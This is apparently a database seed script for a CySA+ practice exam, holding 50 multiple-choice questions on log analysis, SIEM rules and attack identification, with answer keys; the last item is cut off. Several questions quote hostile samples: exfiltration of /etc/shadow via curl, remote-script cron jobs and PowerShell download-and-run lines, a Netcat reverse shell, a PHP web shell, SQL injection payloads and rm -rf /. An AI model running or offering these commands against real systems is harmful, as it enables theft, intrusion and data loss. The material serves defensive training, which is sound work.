db.tests.insertOne({
  "category": "cysa",
  "testId": 1,
  "testName": "Cysa+ Practice Test #1 (Normal)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are reviewing SIEM logs after an alert flagged unusual outbound traffic. Examine the snippet:\n\nFeb 23 12:45:30 webserver1 sshd[2024]: Accepted password for admin from 10.0.3.25 port 55432 ssh2\nFeb 23 12:45:31 webserver1 sshd[2024]: Received disconnect from 10.0.3.25 port 55432:11: disconnected by user\nFeb 23 12:45:35 webserver1 kernel: Outbound connection established to 203.0.113.77:4444\nFeb 23 12:45:36 webserver1 kernel: Outbound connection terminated\nFeb 23 12:45:38 webserver1 sshd[2024]: Accepted password for admin from 10.0.3.25 port 55432 ssh2\n\nWhich indicator most likely suggests malicious activity?",
      "options": [
        "Repeated SSH logins from the same IP address",
        "Temporary outbound connection to port 4444",
        "SSH disconnect immediately after login",
        "SSH login from an internal IP address"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Port 4444 is commonly associated with remote shell access (e.g., Metasploit). The brief outbound connection suggests potential command and control activity.",
      "examTip": "Focus on unusual ports and transient connections as potential C2 activity."
    },
    {
      "id": 2,
      "question": "A captured payload shows the following HTTP request:\n\nGET /login.php?user=admin&password=' OR '1'='1 HTTP/1.1\nHost: internal-app.example.com\n\nWhat type of attack does this payload represent?",
      "options": [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "Command Injection",
        "Cross-Site Request Forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload uses `' OR '1'='1`, a classic SQL injection pattern bypassing authentication.",
      "examTip": "Look for conditional SQL logic (' OR '1'='1) to spot SQL injection attempts."
    },
    {
      "id": 3,
      "question": "A SIEM generates the following alerts in succession:\n1. High outbound traffic to a known malicious IP.\n2. DNS requests for multiple random subdomains of the same domain.\n3. Abnormal PowerShell commands executed on endpoints.\n\nWhat type of malicious behavior do these indicators MOST LIKELY represent?",
      "options": [
        "Lateral movement within the network",
        "Beaconing to a command-and-control server",
        "Credential harvesting via phishing",
        "Distributed Denial of Service (DDoS) preparation"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Repeated DNS requests to random subdomains often indicate C2 beaconing attempts (DNS tunneling).",
      "examTip": "Beaconing often involves low-frequency DNS requests to detect responsive C2 infrastructure."
    },
    {
      "id": 4,
      "question": "Your team receives a threat intel report about a new APT using living-off-the-land techniques. Which data point would provide the strongest confidence of an active threat in your environment?",
      "options": [
        "PowerShell usage for system reconnaissance",
        "Successful connection to known C2 IP addresses",
        "Multiple failed login attempts by a privileged user",
        "Use of Mimikatz for credential dumping"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Confirmed communication with threat actor infrastructure provides direct attribution.",
      "examTip": "Connections to threat actor infrastructure are high-confidence IoCs."
    },
    {
      "id": 5,
      "question": "During an application security assessment, the following API request is captured:\n\nPOST /api/user/update HTTP/1.1\nHost: app.internal.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n{\n   \"userId\": \"12345\",\n   \"role\": \"admin\"\n}\n\nWhich vulnerability is most likely being exploited here?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Cross-Site Request Forgery (CSRF)",
        "SQL Injection",
        "Broken Authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is modifying a user role by changing the userId directly in the API call.",
      "examTip": "IDOR vulnerabilities arise when objects are referenced by user-supplied input without proper validation."
    },
    {
      "id": 6,
      "question": "A ransomware attack has been detected in your environment. Several endpoints show encryption activity. Which action should be performed immediately?",
      "options": [
        "Isolate infected systems from the network",
        "Analyze encryption patterns for malware signatures",
        "Perform forensic imaging of infected drives",
        "Identify the ransomware strain using threat intelligence feeds"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Containment is critical to prevent lateral spread during active ransomware infections.",
      "examTip": "Containment first—limit malware propagation before analysis."
    },
    {
      "id": 7,
      "question": "The following output is from a vulnerability scan:\n\nVulnerability ID: CVE-2023-XXXX\nCVSS Base Score: 9.8 (Critical)\nAttack Vector: Network\nAttack Complexity: Low\nPrivileges Required: None\nUser Interaction: None\nImpact: Complete system takeover possible\n\nGiven the context, which action should be prioritized?",
      "options": [
        "Immediate patch deployment across all vulnerable systems",
        "Conduct penetration testing to confirm exploitability",
        "Apply compensating controls and schedule patching during maintenance",
        "Notify stakeholders while preparing an incident response plan"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Critical, easily exploitable vulnerabilities without user interaction demand urgent patching.",
      "examTip": "Prioritize remediation of critical, network-exploitable vulnerabilities."
    },
    {
      "id": 8,
      "question": "You receive a suspicious email. The header shows:\n\nReceived-SPF: softfail (domain.com: transitioning domain of attacker@malicious.com does not designate 203.0.113.5 as permitted sender)\nAuthentication-Results: dmarc=fail header.from=domain.com\n\nWhat type of attack does this indicate?",
      "options": [
        "Spear phishing with spoofed sender address",
        "Business email compromise (BEC)",
        "Whaling targeting executive leadership",
        "Legitimate email blocked due to misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SPF softfail and DMARC fail indicate spoofing attempts.",
      "examTip": "Failed SPF and DMARC checks strongly indicate spoofed emails."
    },
    {
      "id": 9,
      "question": "Review the Python code snippet:\n\nimport os\nos.system(\"echo 'Malicious payload' > /tmp/exploit.txt\")\n\nWhich security concern does this code pose?",
      "options": [
        "Command injection vulnerability",
        "Insecure deserialization",
        "Privilege escalation",
        "Inadequate input sanitization"
      ],
      "correctAnswerIndex": 0,
      "explanation": "os.system() allows shell command execution, posing injection risks if user input is involved.",
      "examTip": "Avoid os.system()—use safer alternatives like subprocess.run() with sanitized inputs."
    },
    {
      "id": 10,
      "question": "Match each SIEM configuration element to its purpose:\n\n1. Correlation Rule\n2. Data Normalization\n3. Log Aggregation\n4. Threat Intelligence Feed\n\nA) Aggregates logs from all sources\nB) Ensures consistent data formats\nC) Detects patterns indicating threats\nD) Provides context for known threats",
      "options": [
        "1→C, 2→B, 3→A, 4→D",
        "1→B, 2→C, 3→A, 4→D",
        "1→C, 2→A, 3→B, 4→D",
        "1→D, 2→B, 3→A, 4→C"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SIEM correlation rules detect threat patterns, normalization standardizes data, log aggregation collects data, and threat feeds provide known threat context.",
      "examTip": "Understand how SIEM components contribute to threat detection and analysis."
    },
    {
      "id": 11,
      "question": "A network scan reveals multiple hosts responding on port 3389 from external IPs. However, internal policy restricts RDP to internal-only access.\n\nWhat should be your immediate focus based on this discovery?",
      "options": [
        "Review firewall rules for RDP exposure",
        "Check for valid SSL certificates on the hosts",
        "Analyze endpoint logs for RDP brute force attempts",
        "Conduct packet capture to inspect RDP session details"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 3389 (RDP) should not be externally exposed per internal policy. The immediate focus is ensuring firewall rules prevent unauthorized external access.",
      "examTip": "Always verify exposed services against organizational policies first."
    },
    {
      "id": 12,
      "question": "While reviewing logs, you notice repeated DNS queries for domains with random strings (e.g., a1b2c3d4.example.com) followed by minimal HTTP GET requests.\n\nWhich type of activity does this most likely represent?",
      "options": [
        "DNS tunneling for command-and-control communication",
        "Domain generation algorithm (DGA) for malware persistence",
        "Credential harvesting via phishing infrastructure",
        "Distributed Denial of Service (DDoS) preparation"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Domains with random strings indicate domain generation algorithms (DGAs), commonly used by malware for persistence and dynamic C2 communication.",
      "examTip": "Identify DGAs by recognizing patterns of random domain queries with low TTLs."
    },
    {
      "id": 13,
      "question": "Analyze the given Python code snippet:\n\nimport subprocess\nsubprocess.run(['rm', '-rf', '/'], check=True)\n\nWhat is the primary security concern associated with this code?",
      "options": [
        "Privilege escalation vulnerability",
        "Command injection vulnerability",
        "Denial of Service (DoS) through destructive commands",
        "Inadequate input validation"
      ],
      "correctAnswerIndex": 2,
      "explanation": "This command (`rm -rf /`) would attempt to delete all files in the root directory, causing complete system failure, representing a DoS condition.",
      "examTip": "Always validate and restrict subprocess usage, especially for destructive commands."
    },
    {
      "id": 14,
      "question": "You observe the following HTTP request:\n\nPOST /api/payment HTTP/1.1\nHost: secure-payments.com\nContent-Type: application/json\n\n{\n  \"amount\": \"1000\",\n  \"currency\": \"USD\",\n  \"accountId\": \"../../etc/passwd\"\n}\n\nWhich vulnerability does this represent?",
      "options": [
        "Directory traversal",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Broken authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The sequence '../../etc/passwd' attempts to access system files outside the intended directory, representing a directory traversal attack.",
      "examTip": "Look for patterns such as '../' in payloads to detect directory traversal attempts."
    },
    {
      "id": 15,
      "question": "A new critical zero-day vulnerability in an essential cloud service has been publicly disclosed. The vendor has not yet released a patch.\n\nWhich action should be prioritized to mitigate the risk?",
      "options": [
        "Implement compensating controls such as WAF rules or segmentation",
        "Temporarily suspend usage of the affected service",
        "Perform penetration testing to assess exploitability",
        "Notify all stakeholders of the potential service disruption"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Without a patch available, implementing compensating controls like WAF rules or isolating vulnerable services is the best approach to reduce exposure.",
      "examTip": "Use compensating controls when patching is unavailable, especially for critical vulnerabilities."
    },
    {
      "id": 16,
      "question": "The following SIEM correlation rule triggered an alert:\n\nIF (failed_logins > 5) AND (source_ip NOT IN approved_list) AND (login_time BETWEEN 00:00 AND 05:00) THEN ALERT\n\nWhat type of attack behavior is this rule designed to detect?",
      "options": [
        "Brute force authentication attempts",
        "Insider threat data exfiltration",
        "Time-based SQL injection attempts",
        "Credential stuffing using leaked credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Multiple failed logins during off-hours from unauthorized IPs are classic signs of brute force attempts.",
      "examTip": "Combine failed login thresholds with time-based rules to detect brute force attacks."
    },
    {
      "id": 17,
      "question": "Your organization’s vulnerability scan identified the following:\n\n- CVE-2023-XXXX with a CVSS score of 8.8 (High)\n- Network exploitable\n- Requires user interaction\n- Exploitation leads to privilege escalation\n\nWhat factor reduces the urgency for immediate patching compared to a critical vulnerability?",
      "options": [
        "Requirement for user interaction",
        "Privilege escalation impact",
        "Network exploitability",
        "High (but not critical) CVSS score"
      ],
      "correctAnswerIndex": 0,
      "explanation": "User interaction requirements lower the urgency because it reduces the automatic exploitability compared to vulnerabilities needing no user involvement.",
      "examTip": "Prioritize vulnerabilities that require no user interaction for faster remediation."
    },
    {
      "id": 18,
      "question": "Given the following email header snippet:\n\nReceived-SPF: pass (mail.example.com: domain of user@trusted.com designates 198.51.100.5 as permitted sender)\nDKIM-Signature: v=1; a=rsa-sha256; d=trusted.com;\nAuthentication-Results: dmarc=pass header.from=trusted.com\n\nWhat is the most likely conclusion?",
      "options": [
        "The email is likely legitimate based on SPF, DKIM, and DMARC checks.",
        "The email is a spoofed phishing attempt with forged headers.",
        "The email is from a compromised trusted sender account.",
        "The email bypassed security checks using open relay techniques."
      ],
      "correctAnswerIndex": 0,
      "explanation": "All authentication checks (SPF, DKIM, and DMARC) passed, indicating high likelihood of legitimacy unless other contextual evidence proves otherwise.",
      "examTip": "SPF, DKIM, and DMARC alignment typically confirms sender authenticity."
    },
    {
      "id": 19,
      "question": "Analyze the following PowerShell command observed in endpoint logs:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBtAG0AbwByAHQAIABzAG8AbQBlACAAbQBhAGwAaQBjAGkAbwB1AHMAIABjAG8AZABlAA==\n\nWhich threat technique does this represent?",
      "options": [
        "Living-off-the-land (LOtL) attack",
        "Command injection via PowerShell",
        "Privilege escalation through local exploits",
        "Credential dumping using Windows utilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PowerShell with encoded commands, especially with 'ExecutionPolicy Bypass', strongly indicates living-off-the-land techniques to evade detection.",
      "examTip": "Encoded PowerShell commands and bypass flags are hallmarks of LOtL attacks."
    },
    {
      "id": 20,
      "question": "During threat hunting, you identify that an endpoint frequently attempts to resolve DNS queries for subdomains of a domain linked to recent APT activity. However, there is no outbound HTTP or TCP connection established afterward.\n\nWhat could this behavior indicate?",
      "options": [
        "DNS-based command and control beaconing",
        "Active reconnaissance scanning by an attacker",
        "Malicious domain parking by a third party",
        "Credential harvesting through DNS exfiltration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Frequent DNS lookups without follow-up connections strongly suggest DNS-based C2 beaconing, where DNS queries act as the communication channel.",
      "examTip": "Monitor DNS patterns for signs of covert C2 channels, especially with no follow-up traffic."
    },
    {
      "id": 21,
      "question": "A penetration tester sends the following payload to a web application:\n\nGET /profile.php?user=1;DROP TABLE users;-- HTTP/1.1\nHost: vulnerable-webapp.com\n\nWhich attack technique is being attempted?",
      "options": [
        "SQL Injection",
        "Cross-Site Request Forgery (CSRF)",
        "Remote Code Execution (RCE)",
        "XML External Entity (XXE) Attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of `;DROP TABLE users;--` is a classic SQL injection pattern aimed at executing additional SQL statements to delete the users table.",
      "examTip": "SQL injection payloads often contain semicolons (`;`) to chain malicious SQL commands."
    },
    {
      "id": 22,
      "question": "You are reviewing network traffic and notice repeated connections to port 53 from a single internal host with abnormal query patterns:\n\nexample: x1a2b3c4d5.evil-domain.com\n\nWhich type of activity is most likely occurring?",
      "options": [
        "DNS tunneling for exfiltration",
        "Distributed Denial of Service (DDoS) attack",
        "Man-in-the-middle (MITM) interception",
        "Domain generation algorithm (DGA) usage"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 53 traffic with abnormal query patterns often indicates DNS tunneling, which attackers use for covert data exfiltration or C2 communication.",
      "examTip": "Watch for DNS traffic anomalies as they may reveal hidden exfiltration channels."
    },
    {
      "id": 23,
      "question": "Consider the following log entries from a Linux server:\n\nFeb 23 14:12:04 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash\nFeb 23 14:12:05 server sshd[2334]: Accepted publickey for user1 from 192.168.100.55 port 60232\n\nWhat potentially malicious behavior is indicated here?",
      "options": [
        "Privilege escalation attempt via sudo access",
        "Successful brute force attack on SSH credentials",
        "Unauthorized file modification in /home directory",
        "Reverse shell execution from the server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The log shows user1 invoking sudo to execute a root shell, which could indicate an attempt at privilege escalation if not expected behavior.",
      "examTip": "Monitor sudo usage patterns, especially direct root shell executions (`/bin/bash`)."
    },
    {
      "id": 24,
      "question": "A vulnerability scanner output shows:\n\n- CVSS Score: 9.0 (Critical)\n- Attack Vector: Network\n- Privileges Required: None\n- User Interaction: None\n- Exploitability: High\n\nWhich mitigation strategy should be prioritized?",
      "options": [
        "Immediate deployment of vendor patches",
        "Segmentation of affected systems",
        "Application of temporary firewall rules",
        "Creation of compensating access controls"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A critical, remotely exploitable vulnerability with no privileges required demands immediate patch deployment to prevent exploitation.",
      "examTip": "Critical network-exploitable vulnerabilities should be patched immediately when no user interaction is needed."
    },
    {
      "id": 25,
      "question": "A malicious insider attempts to exfiltrate sensitive data using HTTP PUT requests to an external server.\n\nWhat should a SOC analyst implement to detect or prevent this activity?",
      "options": [
        "Deep packet inspection (DPI) at network boundaries",
        "Implement DNS sinkholing for suspicious domains",
        "Enable secure baseline scanning for endpoints",
        "Apply SPF, DKIM, and DMARC policies to outbound email"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DPI examines the content of network traffic, allowing detection and potential blocking of unusual HTTP methods like PUT used for data exfiltration.",
      "examTip": "Deep packet inspection helps detect and block non-standard data transfers across network boundaries."
    },
    {
      "id": 26,
      "question": "Review the Python code snippet:\n\nimport pickle\nuser_data = pickle.loads(untrusted_input)\n\nWhich security issue could arise from this code if `untrusted_input` comes from an external source?",
      "options": [
        "Insecure deserialization",
        "Buffer overflow",
        "SQL injection",
        "Cross-site scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Python's `pickle.loads()` can execute arbitrary code during deserialization, making it vulnerable if untrusted input is provided.",
      "examTip": "Never use `pickle.loads()` on untrusted data—use safer alternatives like `json.loads()` when possible."
    },
    {
      "id": 27,
      "question": "A newly discovered vulnerability in a popular content management system allows arbitrary file uploads without validation.\n\nWhich risk does this vulnerability primarily introduce?",
      "options": [
        "Remote code execution (RCE)",
        "Privilege escalation",
        "Cross-site scripting (XSS)",
        "Session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unrestricted file uploads can lead to remote code execution if attackers upload executable scripts that the server later runs.",
      "examTip": "Always enforce file type and content validation for file uploads."
    },
    {
      "id": 28,
      "question": "An attacker uses the following command:\n\ncurl -X POST -d @/etc/shadow http://malicious-server.com/upload\n\nWhich attack objective is the attacker trying to achieve?",
      "options": [
        "Data exfiltration of sensitive credential files",
        "Establishing a reverse shell connection",
        "Conducting a denial-of-service (DoS) attack",
        "Injecting malicious code into the server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/etc/shadow` file contains password hashes. Posting it to an external server indicates an attempt to exfiltrate sensitive data.",
      "examTip": "Monitor outbound HTTP POST requests for potential data exfiltration attempts."
    },
    {
      "id": 29,
      "question": "A suspicious file is analyzed in a sandbox. The file spawns multiple child processes, disables endpoint protection, and contacts external IPs over port 8080.\n\nWhat does this behavior suggest?",
      "options": [
        "Ransomware activity attempting to disable defenses",
        "Credential harvesting via malicious scripts",
        "Legitimate update process with elevated permissions",
        "Distributed denial-of-service (DDoS) botnet installation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Disabling endpoint protection and spawning child processes are common ransomware behaviors as part of system compromise and encryption routines.",
      "examTip": "Malware that disables security tools and connects externally often indicates ransomware or trojan activity."
    },
    {
      "id": 30,
      "question": "During a web application penetration test, the tester discovers that session tokens are predictable and do not expire after logout.\n\nWhat is the primary risk associated with this finding?",
      "options": [
        "Session hijacking",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Broken access control"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Predictable session tokens combined with lack of expiration increase the risk of session hijacking, where attackers can impersonate legitimate users.",
      "examTip": "Always ensure session tokens are random, securely generated, and expire after logout."
    },
    {
      "id": 31,
      "question": "You review the following log entries from a web server:\n\n192.168.10.10 - - [23/Feb/2025:10:45:11 +0000] \"GET /index.php?id=1 UNION SELECT username, password FROM users-- HTTP/1.1\" 200 532\n\nWhat type of attack is being attempted?",
      "options": [
        "SQL Injection",
        "Cross-site scripting (XSS)",
        "Server-side request forgery (SSRF)",
        "Remote file inclusion (RFI)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of `UNION SELECT` in the URL suggests an attempt at SQL injection to retrieve data from the `users` table.",
      "examTip": "Look for SQL keywords like UNION, SELECT, and WHERE in URLs when detecting SQL injection attempts."
    },
    {
      "id": 32,
      "question": "A network traffic analysis shows continuous small-sized DNS queries to multiple non-existent subdomains of a suspicious domain.\n\nWhich threat technique is most likely represented?",
      "options": [
        "Domain generation algorithm (DGA)",
        "DNS poisoning",
        "DNS amplification attack",
        "Man-in-the-middle (MITM) attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Frequent queries to random subdomains typically indicate DGA usage, allowing malware to find active command-and-control servers.",
      "examTip": "Identify DGA activity by detecting high-volume DNS requests for non-existent domains."
    },
    {
      "id": 33,
      "question": "You discover the following cron job on a Linux server:\n\n* * * * * root curl -fsSL http://malicious-ip.com/payload.sh | sh\n\nWhat is the security concern associated with this cron job?",
      "options": [
        "Persistence mechanism for malicious code execution",
        "Privilege escalation via kernel module exploitation",
        "Credential harvesting using man-in-the-middle attacks",
        "Local file inclusion vulnerability in web applications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The cron job downloads and executes a script every minute, serving as a persistence mechanism for ongoing malicious code execution.",
      "examTip": "Review cron jobs for unauthorized scheduled tasks that download and execute remote code."
    },
    {
      "id": 34,
      "question": "You are reviewing SIEM alerts and notice an internal endpoint making repeated outbound connections to port 6667 on multiple external IP addresses.\n\nWhich type of threat does this activity most likely indicate?",
      "options": [
        "Botnet command-and-control (C2) communication",
        "SQL injection attempts on external servers",
        "Credential stuffing attacks targeting external services",
        "Lateral movement within the internal network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 6667 is commonly associated with IRC-based botnet C2 communication, which suggests that the endpoint may be part of a botnet.",
      "examTip": "Unusual outbound traffic on known C2 ports (e.g., 6667 for IRC) may indicate botnet activity."
    },
    {
      "id": 35,
      "question": "A vulnerability scanner reports a critical vulnerability allowing arbitrary code execution via deserialization of untrusted data in a web application.\n\nWhich control would MOST effectively mitigate this risk?",
      "options": [
        "Input validation and use of secure serialization methods",
        "Implementing strict Content Security Policy (CSP)",
        "Enabling multi-factor authentication (MFA) for all users",
        "Disabling directory listing on the web server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most effective mitigation is to validate input and use secure serialization methods that do not allow code execution during deserialization.",
      "examTip": "Avoid insecure deserialization by using safe formats like JSON and proper input validation."
    },
    {
      "id": 36,
      "question": "Review the following SIEM rule:\n\nIF (process_name = \"powershell.exe\") AND (command_line CONTAINS \"-enc\" OR \"-encodedcommand\") THEN ALERT\n\nWhat threat does this rule aim to detect?",
      "options": [
        "Obfuscated PowerShell command execution",
        "Privilege escalation using PowerShell",
        "Malicious DLL injection via PowerShell",
        "Credential harvesting with Mimikatz"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` or `-encodedcommand` flags are used to obfuscate PowerShell commands, commonly seen in malicious activities to evade detection.",
      "examTip": "Obfuscated PowerShell commands are often used by attackers to bypass security controls—monitor them closely."
    },
    {
      "id": 37,
      "question": "The following API request was captured:\n\nPOST /api/user/create HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\n   \"username\": \"attacker\",\n   \"role\": \"admin\"\n}\n\nWhat type of vulnerability does this demonstrate?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Broken access control",
        "Cross-site request forgery (CSRF)",
        "Command injection"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Allowing role changes in user creation requests without proper authorization checks indicates broken access control.",
      "examTip": "APIs should enforce strict access controls, especially when handling privilege-related operations."
    },
    {
      "id": 38,
      "question": "During incident response, the following PowerShell command is identified:\n\nInvoke-WebRequest -Uri http://malicious-site.com/malware.ps1 -OutFile malware.ps1; powershell.exe -ExecutionPolicy Bypass -File malware.ps1\n\nWhat is the attacker's objective in using this command?",
      "options": [
        "Download and execute a malicious script while bypassing execution policies",
        "Establish a persistent backdoor using encoded PowerShell commands",
        "Extract sensitive data from the local file system",
        "Disable security defenses through privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads a PowerShell script and executes it while bypassing execution restrictions, commonly used for initial payload delivery.",
      "examTip": "Watch for `Invoke-WebRequest` combined with `-ExecutionPolicy Bypass` as signs of initial compromise."
    },
    {
      "id": 39,
      "question": "A file analyzed in a sandbox environment shows the following behavior:\n- Connects to an external IP over port 4444\n- Attempts to modify Windows registry keys related to startup programs\n- Drops a new executable in the Windows Startup folder\n\nWhat does this behavior most likely indicate?",
      "options": [
        "Establishing persistence on the infected host",
        "Privilege escalation via registry manipulation",
        "Ransomware execution targeting user directories",
        "Command-and-control communication for remote access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying startup registry keys and placing executables in the Startup folder are classic methods of achieving persistence.",
      "examTip": "Persistence mechanisms often involve autorun configurations—monitor registry and startup folders closely."
    },
    {
      "id": 40,
      "question": "A security analyst observes this log entry:\n\nFeb 23 15:45:21 webserver sshd[2024]: Accepted password for user from 203.0.113.10 port 50542 ssh2\nFeb 23 15:45:24 webserver kernel: Outbound connection established to 198.51.100.25:12345\n\nWhat should the analyst investigate first?",
      "options": [
        "The nature of the outbound connection to port 12345",
        "Authentication logs for brute force attempts",
        "SSH key configurations for the user account",
        "Firewall rules allowing port 50542 traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Outbound connections to high-numbered ports (e.g., 12345) immediately after authentication could indicate C2 activity; this should be prioritized.",
      "examTip": "Prioritize investigating unusual outbound connections following authentication events—potential indicators of compromise."
    },
    {
      "id": 41,
      "question": "During a forensic investigation, you find the following command in bash history:\n\nnc -e /bin/bash 203.0.113.45 4444\n\nWhat is the attacker attempting to achieve with this command?",
      "options": [
        "Establish a reverse shell connection",
        "Perform port scanning on the network",
        "Create a persistent listener on port 4444",
        "Download a malicious payload from a remote server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nc -e /bin/bash` command uses Netcat to create a reverse shell, giving the attacker remote control over the system.",
      "examTip": "Look for Netcat (`nc`) commands with `-e` flags—common indicators of reverse shells."
    },
    {
      "id": 42,
      "question": "A SIEM alert shows repeated failed login attempts followed by a successful login for the same user account within a short time frame. The successful login occurred from a foreign IP address not previously associated with the user.\n\nWhat should be the FIRST action?",
      "options": [
        "Disable the user account and initiate an investigation",
        "Notify the user to confirm the legitimacy of the login",
        "Check for lateral movement attempts from the compromised account",
        "Perform a password reset for the user account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Disabling the account immediately prevents further potential malicious activity while an investigation is conducted.",
      "examTip": "Account disablement is a critical containment step after suspected credential compromise."
    },
    {
      "id": 43,
      "question": "You observe the following HTTP request during web application testing:\n\nPOST /api/upload HTTP/1.1\nHost: app.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary--\n\nWhich vulnerability is being exploited?",
      "options": [
        "Unrestricted file upload leading to remote code execution",
        "Cross-site scripting (XSS) through file injection",
        "Insecure deserialization via file upload",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading a PHP shell script allows attackers to execute commands remotely, resulting in remote code execution.",
      "examTip": "Ensure strict file validation and disable execution of uploaded files on web servers."
    },
    {
      "id": 44,
      "question": "A suspicious process is identified on a workstation:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server.com/ps.ps1')\"\n\nWhat is the MOST LIKELY goal of this command?",
      "options": [
        "Download and execute a PowerShell script in memory",
        "Obtain elevated privileges through a Windows exploit",
        "Modify Group Policy settings for persistence",
        "Extract credentials from the local SAM database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a PowerShell script directly in memory (`IEX`), avoiding detection by traditional file-based scanners.",
      "examTip": "Commands using `IEX` and `DownloadString` indicate fileless malware techniques."
    },
    {
      "id": 45,
      "question": "A user reports that their browser redirected them to an unknown site after clicking a legitimate link. Review the URL:\n\nhttps://example.com/redirect?url=http://malicious-site.com\n\nWhich vulnerability is most likely present?",
      "options": [
        "Open redirect vulnerability",
        "Cross-site scripting (XSS)",
        "Cross-site request forgery (CSRF)",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Open redirect vulnerabilities occur when user-controlled input determines the redirection destination without validation.",
      "examTip": "Always validate and sanitize URL parameters used in redirects."
    },
    {
      "id": 46,
      "question": "During a security assessment, you find that an application stores passwords in plaintext in a database.\n\nWhat is the MOST critical risk associated with this practice?",
      "options": [
        "Immediate exposure of credentials if the database is compromised",
        "Increased risk of SQL injection attacks",
        "Exposure to session hijacking threats",
        "Potential for privilege escalation within the application"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Storing passwords in plaintext allows attackers to immediately gain user access upon database compromise, leading to further exploitation.",
      "examTip": "Always store passwords using strong hashing algorithms like bcrypt or Argon2."
    },
    {
      "id": 47,
      "question": "A cloud infrastructure assessment reveals that sensitive data buckets in AWS S3 are publicly accessible.\n\nWhich control would most effectively mitigate this issue?",
      "options": [
        "Implement strict bucket policies and ACL configurations",
        "Enable encryption at rest using KMS-managed keys",
        "Deploy CloudFront distributions with signed URLs",
        "Set up CloudTrail logging for all S3 access events"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting public access by configuring proper bucket policies and ACLs ensures only authorized entities can access sensitive data.",
      "examTip": "S3 buckets should have default deny-all policies unless explicitly required otherwise."
    },
    {
      "id": 48,
      "question": "Your organization experiences a sudden spike in outbound traffic to multiple random IP addresses from several internal hosts. The traffic consists mainly of UDP packets.\n\nWhat type of attack does this MOST LIKELY indicate?",
      "options": [
        "DDoS participation as part of a botnet",
        "Data exfiltration via covert channels",
        "Man-in-the-middle (MITM) attack preparation",
        "DNS amplification attack targeting external services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The pattern suggests compromised hosts are participating in a DDoS attack, commonly using UDP traffic for amplification attacks.",
      "examTip": "Monitor for unusual outbound UDP traffic patterns—common in botnet-based DDoS attacks."
    },
    {
      "id": 49,
      "question": "An attacker uses the following request:\n\nGET /product?id=1; EXEC xp_cmdshell 'whoami';-- HTTP/1.1\nHost: vulnerableapp.com\n\nWhat is the attacker attempting to achieve?",
      "options": [
        "Command injection via SQL Server stored procedures",
        "Privilege escalation through local exploits",
        "Exploitation of insecure deserialization processes",
        "Session fixation through predictable session IDs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `xp_cmdshell` procedure allows execution of OS commands from SQL Server; this is a command injection attempt.",
      "examTip": "Disable dangerous stored procedures like `xp_cmdshell` unless absolutely necessary."
    },
    {
      "id": 50,
      "question": "A suspicious binary is detected on an endpoint. Analysis reveals it:\n- Creates a new user with administrator privileges\n- Disables endpoint protection services\n- Contacts external IPs over non-standard ports\n\nWhich type of malware is most likely responsible for this behavior?",
      "options": [
        "Rootkit",
        "Trojan",
        "Worm",
        "Ransomware"
      ],
      "correctAnswerIndex": 1,
